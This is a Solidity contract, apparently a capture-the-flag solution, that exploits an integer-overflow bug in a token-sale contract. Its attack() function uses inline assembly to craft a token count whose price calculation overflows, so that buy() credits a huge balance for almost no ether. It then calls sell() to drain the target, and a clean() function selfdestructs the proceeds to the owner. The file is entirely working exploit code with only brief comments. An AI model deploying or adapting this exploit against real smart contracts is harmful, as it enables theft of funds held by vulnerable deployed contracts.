pragma solidity ^0.4.21;

interface Sale {
    function buy(uint256) external payable;
    function sell(uint256) external;
}

contract TokenSaleAttack {
    Sale public target;
    address public owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function TokenSaleAttack(address _target) public payable {
        require(msg.value == 1 ether);
        
        target = Sale(_target);
        owner = msg.sender;
    }
    
    function attack() public onlyOwner {
        uint256 numTokens;
        uint256 pricePerToken = 1 ether;
        
        // https://medium.com/wicketh/mathemagic-512-bit-division-in-solidity-afa55870a65
        // This divides 2^256 - 1 by 10^18
        assembly {
            numTokens := add(div(sub(0, pricePerToken), pricePerToken), 1)
        }
        
        // Add 1 to overflow
        numTokens += 1;
        
        // Check that it actually overflows
        assert(numTokens * pricePerToken < numTokens);
        
        // Get the wei value to send
        uint256 val = numTokens * pricePerToken;
        
        // Call the buy function to overflow the balance
        target.buy.value(val)(numTokens);

        // Retrieve some of the ether from the challenge
        target.sell(1);
    }
    
    function clean() public {
        selfdestruct(owner);
    }
    
    function() external payable {}
}
